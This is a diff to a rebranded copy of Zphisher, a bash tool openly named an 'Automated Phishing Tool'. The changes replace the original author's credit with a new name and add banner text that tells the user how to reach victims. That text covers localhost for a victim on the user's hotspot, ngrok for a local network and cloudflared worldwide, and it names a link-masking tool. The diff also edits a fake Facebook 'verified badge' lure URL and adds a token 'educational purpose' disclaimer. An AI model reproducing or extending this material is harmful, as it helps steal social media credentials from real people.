@@ -1,12 +1,12 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Author 	: 	Hasanfq 
 ##   Version 	: 	2.2
 ##   Github 	: 	https://github.com/htr-tech
 
 ##   THANKS TO :
-##   Aditya Shakya - https://github.com/adi1090x
+##   Aditya Shakygwa - https://github.com/adi1090x
 ##   1RaY-1 - https://github.com/1RaY-1
 ##   Ali Milani Amin - https://github.com/AliMilani
 ##   Moises Tapia - https://github.com/MoisesTapia
@@ -153,27 +153,51 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE}   __    __                                               __
+		${ORANGE}  |  |  |  |                                             |  |
+		${ORANGE}  |  |  |  |                               /\       _    |  |
+		${ORANGE}  |  |__|  |      /\                      /  \     | \   |  |
+		${ORANGE}  |        |     /  \                    / /\ \    |  \  |  |
+		${ORANGE}  |  ___   |    / /\ \                  /  __  \   | |\\  |  |
+		${ORANGE}  |  |  |  |   /  _   \                /  /  \  \  | | \\ |  |
+		${ORANGE}  |  |  |  |  /  / \   \  ___________ /__/    \__\ |_|  \_ _|   
+		${ORANGE}  |__|  |__| /__/   \ __\ |__________|${GREEN}Version : 2.2
+                ${GRAY}next version is coming soon include free fire reward site 🤑
+                ${YELLOW} I THINK YOU ARE NOW YOU ARE SEARCHING FOR SOCIAL MEDIA ACCOUNT
+                ${BLUE} WE ARE HERE TO HELP A 5% BE SUCCESFULL WE WITH YOU
+                ${YELLOW}IF YOU HAVE ANY ERROR CONTACT ME AS ON >"hasanfq818@gmail.com"<
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by hasanfq (hasan.fatalt)${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+	                    __	  __                                               __
+                ${ORANGE}  |  |  |  |                                             |  |
+                ${ORANGE}  |  |  |  |                               /\       _    |  |
+                ${ORANGE}  |  |__|  |      __                      /  \     | \   |  |
+                ${ORANGE}  |        |     /  \                    / /\ \    |  \  |  |
+                ${ORANGE}  |  ___   |    / /\ \                  /  __  \   | |\\  |  |
+                ${ORANGE}  |  |  |  |   /  _   \                /  /  \  \  | | \\ |  |
+                ${ORANGE}  |  |  |  |  /  / \   \  ___________ /__/    \__\ |_|  \___|
+                ${ORANGE}  |__|  |__| /__/   \ __\ |__________|${BLUE}Version :${GRAY} 2.2
+               
+               ${GRAY} H͟O͟W͟ T͟O͟ U͟S͟E͟ T͟H͟E͟ P͟O͟R͟T͟  FORWARDING M͟E͟T͟H͟O͟D͟ S  ${RED} .!
+   
+               ${ORANGE} *Localhost = you can use localhost if your victim in on your network
+               ${ORANGE}               example:
+               ${BLUE}                   1.your victim conected to your hotspot
+               ${BLUE}                   2.your victim put the id and pass on your phone.
+               ${ORANGE} *Ngrok = you can use ngrok if your victim is on local area network
+               ${ORANGE} *Cloudflared = you can use it for the world wide with out any issue
+
+               
+               ${RED} if you wan to shorten the link go and install maskphish tool
+               ${BLUE} WARNING ${GRAY}!!!
+               ${BLUE} Cloudflared link can't shorten by maskphish and any tool ${RED}!!!
+             
 	EOF
 }
 
@@ -490,7 +514,7 @@ site_facebook() {
 	case $REPLY in 
 		1 | 01)
 			website="facebook"
-			mask='http://blue-verified-badge-for-facebook-free'
+			mask='http://blue-verifing-badge-for-facebook-free'
 			tunnel_menu;;
 		2 | 02)
 			website="fb_advanced"
@@ -767,6 +791,8 @@ main_menu() {
 	
 	esac
 }
+
+               echo -e "thank's for using this script created by hasanfq be i will not responsible for any damage issued my this script this made for only educational purpose..!"
 
 ## Main
 kill_pid
